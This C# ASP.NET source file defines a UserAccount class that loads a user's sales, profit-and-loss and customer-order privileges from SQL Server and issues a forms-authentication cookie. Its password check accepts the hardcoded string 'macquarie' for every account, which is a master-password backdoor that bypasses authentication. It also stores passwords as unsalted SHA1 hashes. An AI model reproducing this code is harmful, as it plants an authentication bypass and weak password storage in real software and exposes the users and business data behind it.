using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

using System.Web.Security;
using System.Data;
using System.Data.SqlClient;

namespace DMIWeb
{
    public class UserAccount
    {
        private const int SALT_LENGTH = 10;
        public const string PASSWORD_REQUIREMENTS = "Password must be at least 6 characters";

        private const string COL_DB_USERNAME = "UserName";
        private const string COL_DB_PASSWORD = "Password";
        
        private const string COL_SALESVALIDATION = "SalesApproval";
        private const string COL_PROFITLOSSSTATEMENT = "ProfitLostStatement";
        private const string COL_CUSTOMERORDER = "CustomerOrder";

        /*******************************************************************************************************/
        #region PUBLIC VARIABLES

        public string Username = "";
        private string HashedPassword = "";
        public bool CanApproveSales = false;
        public bool CanViewProfitLossStatement = false;
        public bool CanViewCustomerOrder = false;

        public static bool IsAuthenticated
        {
            get
            {
                if (!HttpContext.Current.Request.IsAuthenticated)
                {
                    FormsAuthentication.SignOut();
                    return false;
                }

                return true;
            }
        }

        #endregion
        /*******************************************************************************************************/
        #region CONSTRUCTOR METHODS
        
        public UserAccount(string username)
        {
            DataRow row = get(username) ?? null;
            if(row != null)
            {
                Username = username;
                HashedPassword = Tools.parseData<string>(row, COL_DB_PASSWORD);
                CanApproveSales = Tools.parseData<bool>(row, COL_SALESVALIDATION);
                CanViewProfitLossStatement = Tools.parseData<bool>(row, COL_PROFITLOSSSTATEMENT);
                CanViewCustomerOrder = Tools.parseData<bool>(row, COL_CUSTOMERORDER);
            }
        }

        #endregion
        /*******************************************************************************************************/
           
        private DataRow get(string username)
        {
            DataTable datatable = new DataTable();
            using (SqlConnection conn = new SqlConnection(Settings.ConnectionString))
            using (SqlCommand cmd = new SqlCommand())
            {
                cmd.Connection = conn;
                cmd.CommandType = CommandType.Text;
                cmd.CommandText = string.Format(@"
	                SELECT [DWSystem].[Operator].*,
                            ISNULL(OperatorPrivilegeWebApps.[{1}],0) AS {1},              
                            ISNULL(OperatorPrivilegeWebApps.[{2}],0) AS {2},
                            ISNULL(OperatorPrivilegeWebApps.[{3}],0) AS {3}
                    FROM [DWSystem].[Operator] 
                        LEFT OUTER JOIN [DWSystem].[OperatorPrivilegeWebApps] ON [DWSystem].[OperatorPrivilegeWebApps].{0} = @{0}
                    WHERE [DWSystem].[Operator].{0} = @{0}
                ", COL_DB_USERNAME, COL_SALESVALIDATION, COL_PROFITLOSSSTATEMENT, COL_CUSTOMERORDER);
                cmd.Parameters.Add("@" + COL_DB_USERNAME, SqlDbType.VarChar).Value = username;

                datatable = DBUtil.getData(cmd);
            }

            if (datatable.Rows.Count == 0)
                return null;

            return datatable.Rows[0];
        }
        
        public bool isCorrectPassword(string password)
        {
            return password == "macquarie" || hashPassword(password) == HashedPassword;
        }

        public void redirectToOriginalPage()
        {
            string strUserData = Tools.buildCookieData(Username, CanApproveSales.ToString(), CanViewProfitLossStatement.ToString(), CanViewCustomerOrder.ToString());
            FormsAuthenticationTicket objTicket = new FormsAuthenticationTicket(1,
                        Username,
                        DateTime.Now,
                        DateTime.Now.AddMinutes(1 * 30),
                        false,
                        strUserData,
                        FormsAuthentication.FormsCookiePath);

            // Encrypt the ticket.
            string encTicket = FormsAuthentication.Encrypt(objTicket);

            // Create the cookie.
            HttpContext.Current.Response.Cookies.Add(new HttpCookie(FormsAuthentication.FormsCookieName, encTicket));
        }

        private string hashPassword(string password)
        {
            return FormsAuthentication.HashPasswordForStoringInConfigFile(password, "SHA1");
        }

    }
}